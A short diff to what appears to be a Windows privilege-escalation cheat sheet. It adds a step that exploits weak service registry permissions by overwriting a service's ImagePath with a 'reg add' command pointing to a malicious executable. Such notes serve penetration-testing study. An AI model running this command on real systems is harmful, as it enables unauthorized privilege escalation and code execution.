@@ -282,6 +282,11 @@ ___
 			.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<service_name>
 			```
 
+			+ overwrite the **ImagePath** registry value:
+
+				```cmd
+				reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\malicious.exe /f	
+				```
 	+ modifying a configuration option of a service:
 
 		```cmd
